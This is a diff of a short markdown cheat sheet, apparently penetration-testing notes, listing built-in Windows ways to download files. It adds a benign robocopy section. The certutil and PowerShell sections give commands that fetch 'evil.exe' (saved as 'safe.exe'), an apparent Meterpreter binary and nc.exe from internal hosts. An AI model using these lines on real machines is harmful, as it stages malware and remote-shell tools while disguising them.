@@ -1,12 +1,24 @@
 # Built in windows utility to download file:
-## certutil.exe
+## robocopy
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
 
+Syntax:
+```
+robocopy <source> <destination> [<file>[ ...]] [<options>]
+```
+Example:
+```
+robocopy c:\reports '\\marketing\videos' yearly-report.mov /mt /z
+```
+1. /mt - multi-threading 
+2. /z - restart the transfer in case it's interrupted
+## certutil.exe
 ```
 certutil.exe -urlcache -split -f http://10.10.0.101/evil.exe safe.exe
 certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 ```
 
-## Powershell:
+## Powershell
 ```
 (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
 (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")	
